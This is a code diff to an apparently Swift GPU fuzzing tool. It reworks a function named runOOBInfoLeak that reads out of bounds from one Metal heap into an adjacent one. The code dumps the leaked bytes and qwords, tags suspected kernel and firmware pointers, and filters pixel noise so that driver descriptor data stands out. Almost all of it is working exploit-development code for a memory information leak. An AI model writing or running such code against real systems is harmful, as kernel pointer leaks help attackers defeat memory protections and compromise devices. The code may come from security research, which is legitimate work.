@@ -703,7 +703,31 @@ func runOOBInfoLeak(log: FuzzLog, completion: @escaping () -> Void) {
         guard dist == UInt(actual) else { step("✗ not adjacent"); completion(); return }
         step("✓ adjacent confirmed")
 
-        // Scan helper: OOB-read all of h1 and log non-zero 8-byte qwords
+        // Raw byte dump of h1[0..511] — shows ALL non-zero bytes, not just qword-aligned
+        func scanRawH1(label: String) {
+            step("  -- \(label) [raw 512B] --")
+            var anyNonZero = false
+            var i = 0
+            while i < 512 {
+                // collect 16-byte row
+                var row = [UInt8](repeating: 0, count: 16)
+                var hasNZ = false
+                for j in 0..<16 {
+                    let byte = p0[actual + i + j]
+                    row[j] = byte
+                    if byte != 0 { hasNZ = true }
+                }
+                if hasNZ {
+                    anyNonZero = true
+                    let hex = row.map { String(format: "%02x", $0) }.joined(separator: " ")
+                    step("  h1[+0x\(String(i, radix:16))] \(hex)")
+                }
+                i += 16
+            }
+            if !anyNonZero { step("  (all zero in first 512 bytes)") }
+        }
+
+        // Qword scan of all h1 — skip GPU pixel fill pattern and common noise
         func scanH1(label: String) {
             var found = 0
             step("  -- \(label) --")
@@ -711,31 +735,40 @@ func runOOBInfoLeak(log: FuzzLog, completion: @escaping () -> Void) {
                 var val: UInt64 = 0
                 for b in 0..<8 { val |= UInt64(p0[actual + qw*8 + b]) << (b*8) }
                 guard val != 0 && val != 0xFFFFFFFFFFFFFFFF else { continue }
+                // filter GPU shader pixel fill: RGBA(1,0,0,1) packed = 0xFF0000FFFF0000FF
+                // and any repeating-4-byte pattern which is pure pixel data
+                let lo32 = UInt32(val & 0xFFFFFFFF)
+                let hi32 = UInt32(val >> 32)
+                if lo32 == hi32 && lo32 != 0 { continue }  // repeating 4-byte = pixel
                 let tag: String
                 if val >= 0xFFFFFE0000000000 { tag = " *** KERNEL/FW PTR" }
                 else if val >= 0x100000000   { tag = " (user/gpu va)" }
-                else                          { tag = "" }
+                else                          { tag = " (small val)" }
                 step("  h1[+0x\(String(qw*8,radix:16))] = 0x\(String(val,radix:16))\(tag)")
                 found += 1
-                if found >= 60 { step("  ... truncated"); break }
+                if found >= 80 { step("  ... truncated"); break }
             }
-            if found == 0 { step("  (all zero)") }
+            if found == 0 { step("  (all zero / only pixel fill)") }
         }
 
-        // Phase A: scan h1 before any texture or GPU — baseline (should be zero)
-        scanH1(label: "A: before alloc")
+        // Phase A: baseline before any texture — both raw and qword
+        scanRawH1(label: "A: before alloc")
+        scanH1(label: "A: before alloc (qword)")
 
-        // Place 32×32 texture at h1[4096] — Metal writes texture descriptor header to h1 shared mem
+        // 1×1 RGBA8 texture — only 4 bytes of pixel data, kills the noise
+        // Any non-zero h1 values after makeTexture are driver descriptor bytes, not pixels
         let td = MTLTextureDescriptor.texture2DDescriptor(pixelFormat: .rgba8Unorm,
-                                                           width: 32, height: 32, mipmapped: false)
+                                                           width: 1, height: 1, mipmapped: false)
         td.storageMode = .shared; td.usage = [.shaderRead, .shaderWrite]
         guard let tex1 = h1.makeTexture(descriptor: td) else { step("tex1 nil"); completion(); return }
-        step("tex1 created at h1[4096] — 32×32 rgba8 shared")
+        let texAlign = device.heapTextureSizeAndAlign(descriptor: td)
+        step("tex1 alloc: size=\(texAlign.size) align=\(texAlign.align) — 1×1 rgba8 shared")
 
-        // Phase B: scan immediately after makeTexture — descriptor bytes written by Metal driver
-        scanH1(label: "B: after makeTexture (descriptor live)")
+        // Phase B: immediately after makeTexture — look for Metal driver descriptor writes
+        scanRawH1(label: "B: after makeTexture")
+        scanH1(label: "B: after makeTexture (qword)")
 
-        // Submit compute pass and scan DURING GPU execution (descriptor + command metadata active)
+        // Submit compute pass — GPU writes ONE red pixel, minimal noise
         let src = """
         #include <metal_stdlib>
         using namespace metal;
@@ -752,17 +785,19 @@ func runOOBInfoLeak(log: FuzzLog, completion: @escaping () -> Void) {
                   let enc = cmd.makeComputeCommandEncoder() else { step("cmd nil"); completion(); return }
             enc.setComputePipelineState(pso)
             enc.setTexture(tex1, index: 0)
-            enc.dispatchThreadgroups(MTLSize(width:4,height:4,depth:1),
-                                     threadsPerThreadgroup: MTLSize(width:8,height:8,depth:1))
+            enc.dispatchThreadgroups(MTLSize(width:1,height:1,depth:1),
+                                     threadsPerThreadgroup: MTLSize(width:1,height:1,depth:1))
             enc.endEncoding()
             cmd.commit()
-            // Phase C: scan while GPU is executing (command submitted, not yet complete)
-            scanH1(label: "C: during GPU execution")
+            // Phase C: during GPU execution
+            scanRawH1(label: "C: during GPU")
+            scanH1(label: "C: during GPU (qword)")
             cmd.waitUntilCompleted()
         } catch { step("PSO err: \(error.localizedDescription)"); completion(); return }
 
-        // Phase D: scan after GPU completes — see what persists vs what was transient
-        scanH1(label: "D: after GPU completion")
+        // Phase D: after GPU completes — what persists?
+        scanRawH1(label: "D: after GPU done")
+        scanH1(label: "D: after GPU done (qword)")
 
         step("── OOB Info Leak complete ─────────────────")
         completion()
